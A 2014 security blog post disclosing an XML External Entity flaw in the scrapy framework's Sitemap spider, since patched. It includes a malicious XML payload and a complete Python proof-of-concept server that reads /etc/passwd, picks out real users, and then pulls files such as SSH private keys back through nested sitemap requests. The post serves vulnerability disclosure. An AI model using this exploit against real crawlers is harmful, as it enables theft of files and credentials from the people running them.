
<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">

    <title>Exploiting the scraper</title>
    <meta name="description" content="">

    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">

    <link rel="shortcut icon" href="/favicon.ico">

    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.4.0/css/font-awesome.min.css">
    <link rel="stylesheet" type="text/css" href="/assets/css/prism.css?v=31ba63e1d1">
    <link rel="stylesheet" type="text/css" href="/assets/css/screen.css?v=31ba63e1d1">
    <link rel="stylesheet" type="text/css" href="//fonts.googleapis.com/css?family=Merriweather:300,700,700italic,300italic%7COpen+Sans:700,400">

    <link rel="canonical" href="http://www.spect.cl/blog/2014/08/exploiting-the-scraper/">
    <meta name="referrer" content="no-referrer-when-downgrade">
    <link rel="amphtml" href="http://www.spect.cl/blog/2014/08/exploiting-the-scraper/amp/">
    
    <meta property="og:site_name" content="SPECT Research">
    <meta property="og:type" content="article">
    <meta property="og:title" content="Exploiting the scraper">
    <meta property="og:description" content="As some of you have noticed, the post frequency has been low in last years because I've been happily working full-time for more than two years at Scrapinghub, the company behind the popular scrapy framework. I've been working mostly on software projects not related to security so only in my">
    <meta property="og:url" content="http://www.spect.cl/blog/2014/08/exploiting-the-scraper/">
    <meta property="article:published_time" content="2014-08-08T11:00:00.000Z">
    <meta property="article:modified_time" content="2015-09-10T08:38:33.000Z">
    <meta property="article:tag" content="vulnerability">
    <meta property="article:tag" content="python">
    <meta property="article:tag" content="scrapy">
    
    <meta name="twitter:card" content="summary">
    <meta name="twitter:title" content="Exploiting the scraper">
    <meta name="twitter:description" content="As some of you have noticed, the post frequency has been low in last years because I've been happily working full-time for more than two years at Scrapinghub, the company behind the popular scrapy framework. I've been working mostly on software projects not related to security so only in my">
    <meta name="twitter:url" content="http://www.spect.cl/blog/2014/08/exploiting-the-scraper/">
    <meta name="twitter:label1" content="Written by">
    <meta name="twitter:data1" content="Claudio Salazar">
    <meta name="twitter:label2" content="Filed under">
    <meta name="twitter:data2" content="vulnerability, python, scrapy">
    <meta name="twitter:site" content="@spectresearch">
    
    <script type="application/ld+json">
{
    "@context": "https://schema.org",
    "@type": "Article",
    "publisher": {
        "@type": "Organization",
        "name": "SPECT Research",
        "logo": "http://www.spect.cl/ghost/img/ghosticon.jpg"
    },
    "author": {
        "@type": "Person",
        "name": "Claudio Salazar",
        "image": {
            "@type": "ImageObject",
            "url": "//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&d=mm&r=x",
            "width": 250,
            "height": 250
        },
        "url": "http://www.spect.cl/author/claudio/",
        "sameAs": []
    },
    "headline": "Exploiting the scraper",
    "url": "http://www.spect.cl/blog/2014/08/exploiting-the-scraper/",
    "datePublished": "2014-08-08T11:00:00.000Z",
    "dateModified": "2015-09-10T08:38:33.000Z",
    "keywords": "vulnerability, python, scrapy",
    "description": "As some of you have noticed, the post frequency has been low in last years because I&#x27;ve been happily working full-time for more than two years at Scrapinghub, the company behind the popular scrapy framework. I&#x27;ve been working mostly on software projects not related to security so only in my",
    "mainEntityOfPage": {
        "@type": "WebPage",
        "@id": "http://www.spect.cl"
    }
}
    </script>

    <meta name="generator" content="Ghost 0.11">
    <link rel="alternate" type="application/rss+xml" title="SPECT Research" href="http://www.spect.cl/rss/">
    <script>
var disqus_shortname = 'spectresearch';
var ga_id = 'UA-18043187-1';
</script>
</head>

<body><header class="main-header no-cover">
    <div class="vertical">
        <div class="main-header-content inner">
            <h1 class="page-title">SPECT Research</h1>
            <h2 class="page-description">Security and Software Development</h2>
            <br>
            <div>
              <a class="spectnav" href="/"><i class="fa fa-home"></i> Home</a>
              <a class="spectnav" href="/about/"><i class="fa fa-group"></i> About us</a>
              <a class="spectnav" href="/projects/"><i class="fa fa-copy"></i> Projects</a>
              <a class="spectnav" href="/education/"><i class="fa fa-book"></i> Education</a>
            </div>
            <div>
              <a class="spectnav" href="http://github.com/spectresearch"><i class="spectnav fa fa-github"></i></a>
              <a class="spectnav" href="http://twitter.com/spectresearch"><i class="spectnav fa fa-twitter"></i></a>
            </div>
        </div>
    </div>
    <a class="scroll-down icon-arrow-left" href="#content" data-offset="-45"><span class="hidden">Scroll Down</span></a>
</header>



    

    <div class="site-wrapper">

        


<main class="content" role="main">
    <article class="post tag-vulnerability tag-python tag-scrapy">

        <header class="post-header">
            <h1 class="post-title">Exploiting the scraper</h1>
            <section class="post-meta">
                <time class="post-date" datetime="2014-08-08">08 August 2014</time>  on <a href="/tag/vulnerability/">vulnerability</a>, <a href="/tag/python/">python</a>, <a href="/tag/scrapy/">scrapy</a>
            </section>
        </header>

        <section class="post-content">
            <p>As some of you have noticed, the post frequency has been low in last years because I've been happily working full-time for more than two years at <a href="http://www.scrapinghub.com">Scrapinghub</a>, the company behind the popular <a href="http://www.scrapy.org">scrapy</a> framework. I've been working mostly on software projects not related to security so only in my spare time I dedicate time on it.</p>

<p><em>scrapy</em> is a powerful framework to do web scraping and it usually doesn't involve server side things, unless you use the <a href="http://scrapyd.readthedocs.org/en/latest/">scrapyd</a> project
to manage your scrapy spiders. So I was a bit worried about the security of this tool because I use it daily and any vulnerability would affect me (client-side).</p>

<p>Well, scrapy uses <a href="http://lxml.de/">lxml</a> under the hood to do HTML/XML processing and with the <a href="http://projects.webappsec.org/w/page/13247003/XML%20External%20Entities">XML External Entity</a> (XXE) attacks around, I wanted to test if scrapy was vulnerable to it in some way. Indeed, it was vulnerable as I described in this <a href="https://github.com/scrapy/scrapy/pull/676">pull request</a> and in this post I'll explain to you an automated way to exploit it.</p>

<h2 id="findingavulnerablecomponent">Finding a vulnerable component</h2>

<p>I knew that <em>lxml</em> was used at <a href="http://doc.scrapy.org/en/latest/topics/selectors.html">Selectors</a> and some kind of spiders like <a href="http://doc.scrapy.org/en/latest/topics/spiders.html#sitemapspider">Sitemap spider</a>. Both components can handle <em>XML</em> files and were vulnerable since they initialized their instance of <code>XMLParser</code> in this way:</p>

<pre><code class="language- language-python">lxml.etree.XMLParser(recover=True, remove_comments=True)  
</code></pre>

<p>According to the <a href="http://lxml.de/api/lxml.etree.XMLParser-class.html">documentation</a>, <code>resolve_entities</code> argument is <code>True</code> by default, which makes it vulnerable to the above mentioned <em>XXE</em> attacks.</p>

<p>Before starting the search of vulnerabilities, I'm always thinking about a successful exploitation. In this case, <code>Selectors</code> weren't a good spot since I could create a malicious <em>XML</em> file, serve it in a web server, a <em>scrapy</em> spider would have parsed it and the vulnerability would have been triggered but I didn't have a way to get that data back to me.</p>

<p>On the other side, from my experience I had seen that sitemaps sometimes contain nested sitemap and they are always requested, so in that way I could keep a flow between a server controlled by me and the victim scrapy spider. That's the choosen path to exploit this vulnerability.</p>

<h2 id="abitmoreaboutsitemapsandsitemapspider">A bit more about sitemaps and Sitemap spider</h2>

<p><a href="http://www.sitemaps.org/protocol.html">Sitemaps</a> are files that sites uses to index content instead of crawling the whole site to access every item. They usually contains url sets, but there's the chance to contain more sitemaps. <code>Sitemap</code> spider will request normal url sets and call a callback, so we can't get the data of a successful attack from that. But we could nest <em>XML</em> sitemaps and create dynamic responses always containing a sitemap, so we could keep a flow with the victim spider.</p>

<h2 id="exploitingthevulnerabilityinaautomatedway">Exploiting the vulnerability in a automated way</h2>

<p>To exploit this vulnerability we need a victim using the <code>Sitemap</code> spider. An example of this would be this simple spider:</p>

<pre><code class="language- language-python">from scrapy.contrib.spiders import SitemapSpider


class TestSpider(SitemapSpider):  
    name = 'test'
    sitemap_urls = ['http://localhost:5000/sitemap.xml']

    def parse(self, response):
        pass
</code></pre>

<p>On the server side, the steps are:</p>

<ul>
<li>Create a server listening on port 5000 (as the spider set in <code>sitemap_urls</code>).</li>
<li>Create a malicious <em>XML</em> file as explained below:</li>
</ul>

<pre><code class="language- language-xml">&lt;?xml version="1.0" encoding="UTF-8" ?&gt;  
&lt;!DOCTYPE foo [  
&lt;!ELEMENT foo ANY &gt;  
&lt;!ENTITY xxe SYSTEM "file://{file_path}" &gt;  
]&gt;
&lt;sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;  
&lt;sitemap&gt;&lt;loc&gt;http://localhost:5000/&amp;xxe;.xml&lt;/loc&gt;&lt;/sitemap&gt;  
&lt;/sitemapindex&gt;  
</code></pre>

<p>We can set <code>file_path</code> to any file we want to read and our file contains a nested sitemap with the payload to trigger the vulnerability.</p>

<ul>
<li>As you see from our malicious file, the next sitemap will be requested and in its path it will contain the contents of <code>file_path</code>. Now we have a way to get retrieve the data from the victim.</li>
<li>Do we want only a file? No. We can answer the last request with our malicious file and request more files.</li>
</ul>

<p>Things get interesting when in the first response you put a payload to read <code>/etc/passwd</code>, receive the contents, recreate the list of real users (not system users) and in the next response you could read <code>/home/%user/.ssh/id_rsa</code> and bingo!</p>

<p>Two things to consider but that are fully implemented in the PoC: the sitemap <code>loc</code> needs to end in <code>.xml</code> and frameworks like <em>Bottle</em> or <em>Flask</em> couldn't handle the weird requests containing <code>/etc/passwd</code> contents so I had to use the built-in <em>HTTP</em> server.</p>

<p>The malicious server code is pasted below. It's just a PoC.</p>

<pre><code class="language- language-python">import re  
import sys  
import time  
import BaseHTTPServer

from SimpleHTTPServer import SimpleHTTPRequestHandler  
from urllib import unquote

sitemap_document = """&lt;?xml version="1.0" encoding="UTF-8" ?&gt;  
&lt;!DOCTYPE foo [  
&lt;!ELEMENT foo ANY &gt;  
&lt;!ENTITY xxe SYSTEM "file://{file_path}" &gt;  
]&gt;
&lt;sitemapindex xmlns="http://www.sitemaps.org/schemas/sitemap/0.9"&gt;  
&lt;sitemap&gt;{content}&lt;/sitemap&gt;  
&lt;/sitemapindex&gt;  
"""


class WebServerHandler(SimpleHTTPRequestHandler):  
    users = []

    def get_sitemap(self, file_path):
        """ .xml at the end makes it a valid XML file """
        loc = "&lt;loc&gt;http://localhost:5000/&amp;xxe;.xml&lt;/loc&gt;"
        return sitemap_document.format(file_path=file_path, content=loc)

    def parse_users(self, path):
        users = set([u for u in re.findall('/|0A([^:]+):x:', path) if u])
        system_users = set([
            'daemon', 'bin', 'sys', 'sync', 'games', 'man', 'lp', 'mail', 'news', 'uucp',
            'proxy', 'www-data', 'backup', 'list', 'irc', 'gnats', 'nobody', 'libuuid',
            'syslog', 'messagebus', 'usbmux', 'dnsmasq', 'avahi-autoipd', 'kernoops',
            'rtkit', 'whoopsie', 'speech-dispatcher', 'avahi', 'lightdm', 'pulse',
            'hplip', 'colord', 'saned', 'gdm', 'debian-spamd', 'sshd', 'statd', 'puppet',
            'landscape', 'pollinate'
        ])

        self.users = list(users - system_users)
        print('[+] Obtained users: %s' % ', '.join(self.users))

    def request_file(self):
        #First step is ask for /etc/passwd
        if not self.users:
            return self.get_sitemap('/etc/passwd')
        else:
            #Use first user for PoC
            user = self.users[0]
            return self.get_sitemap(sys.argv[1] % user)

    def do_GET(self):
        self.send_response(200)
        self.end_headers()

        #Read requested URL in search of valuable data
        if 'root:x:0:0' in self.path:
            self.parse_users(self.path)
        elif 'sitemap' not in self.path:
            try:
                content = unquote(re.findall('/(.*?)\.xml', self.path)[0])
                print("[+] Possible document: %s" % content)
            except:
                print("[-] Failed getting file")

        time.sleep(3)

        #Request next file
        content = self.request_file()
        self.wfile.write(content)

    def log_message(self, format, *args):
        return


def setup_webserver(server_class=BaseHTTPServer.HTTPServer):  
    """ Setup webserver for serve files """
    server_address = ('localhost', 5000)
    httpd = server_class(server_address, WebServerHandler)
    try:
        print('To exit, press Ctrl-c')
        httpd.serve_forever()
    except KeyboardInterrupt:
        print('Exiting ..')
        sys.exit(0)


if __name__ == '__main__':  
    if len(sys.argv) != 2:
        print('Use: python %s filename_to_get' % sys.argv[0])
        print('filename_to_get format: /home/%s/filename')
        sys.exit(1)

    setup_webserver()
</code></pre>

<p>And a video showing the exploitation is here. It reads the local file <code>flag.txt</code> of the victim.</p>

<iframe width="560" height="315" src="https://www.youtube.com/embed/PF0RfxSutB8?rel=0" frameborder="0" allowfullscreen></iframe>

<h2 id="conclusion">Conclusion</h2>

<p>The <a href="https://github.com/scrapy/scrapy/pull/676">pull request</a> fixing the vulnerability was discussed with the scrapy dev team and in <strong>few</strong> days it was merged into master. It's always good to resolve security issues quickly.</p>

<p>I want to clarify that only versions &lt;= 0.21 were vulnerable to this vulnerability. Even in <a href="http://doc.scrapy.org/en/latest/topics/ubuntu.html">Ubuntu repositories</a> there are many patched versions available. After this, we agree on opening a <a href="http://doc.scrapy.org/en/latest/contributing.html#reporting-bugs">security mailing list</a> to address this kind of bugs, which is a good initiative and I expect to continue contribuiting to it.</p>
        </section>

        <footer class="post-footer">


            <figure class="author-image">
                <a class="img" href="/author/claudio/" style="background-image: url(//www.gravatar.com/avatar/134e22ab3b4cac1e783f88f84917bc12?s=250&amp;d=mm&amp;r=x)"><span class="hidden">Claudio Salazar's Picture</span></a>
            </figure>

            <section class="author">
                <h4><a href="/author/claudio/">Claudio Salazar</a></h4>

                    <p>Read <a href="/author/claudio/">more posts</a> by this author.</p>
                <div class="author-meta">
                    
                    
                </div>
            </section>


            <section class="share">
                <h4>Share this post</h4>
                <a class="icon-twitter" href="https://twitter.com/share?text=Exploiting%20the%20scraper&amp;url=http://www.spect.cl/blog/2014/08/exploiting-the-scraper/" onclick="window.open(this.href, 'twitter-share', 'width=550,height=235');return false;">
                    <span class="hidden">Twitter</span>
                </a>
                <a class="icon-facebook" href="https://www.facebook.com/sharer/sharer.php?u=http://www.spect.cl/blog/2014/08/exploiting-the-scraper/" onclick="window.open(this.href, 'facebook-share','width=580,height=296');return false;">
                    <span class="hidden">Facebook</span>
                </a>
                <a class="icon-google-plus" href="https://plus.google.com/share?url=http://www.spect.cl/blog/2014/08/exploiting-the-scraper/" onclick="window.open(this.href, 'google-plus-share', 'width=490,height=530');return false;">
                    <span class="hidden">Google+</span>
                </a>
            </section>

        <footer class="post comments">
  <div id="disqus_thread"></div>
  <script type="text/javascript">
  (function() {
  var dsq = document.createElement('script'); dsq.type = 'text/javascript'; dsq.async = true;
  dsq.src = '//' + window.disqus_shortname + '.disqus.com/embed.js';
  (document.getElementsByTagName('head')[0] || document.getElementsByTagName('body')[0]).appendChild(dsq);
  })();
  </script>
  <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
  <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
</footer>

        </footer>

    </article>
</main>

<aside class="read-next">
    <a class="read-next-story no-cover" href="/blog/2015/09/is-it-safe-to-shop-on-the-chilean-internet-no/">
        <section class="post">
            <h2>Is it safe to shop on the Chilean Internet? No.</h2>
            <p>When you go to a bank to open a checking account, it's almost a must-have to contract a fraud…</p>
        </section>
    </a>
    <a class="read-next-story prev no-cover" href="/blog/2014/04/notsosecure-ctf2-writeup/">
        <section class="post">
            <h2>NotSoSecure CTF2 Writeup</h2>
            <p>Since for the first NotSoSecure CTF I had a lot of fun, I joined again for the new version.…</p>
        </section>
    </a>
</aside>



        <footer class="site-footer clearfix">
            <section class="copyright"><a href="http://www.spect.cl">SPECT Research</a> © 2016</section>
        </footer>

    </div>

    <!-- You can safely delete this line if your theme does not require jQuery -->
<script type="text/javascript" src="https://code.jquery.com/jquery-1.11.3.min.js"></script>
    <script>
  if (window.ga_id) {
    (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
    (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
    m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
    })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
    ga('create', window.ga_id, 'auto');
    ga('require', 'linkid', 'linkid.js');
    ga('send', 'pageview');
  }
</script>

    <script type="text/javascript" src="/assets/js/prism.js?v=31ba63e1d1"></script>
    <script type="text/javascript" src="/assets/js/jquery.fitvids.js?v=31ba63e1d1"></script>
    <script type="text/javascript" src="/assets/js/index.js?v=31ba63e1d1"></script>


</body>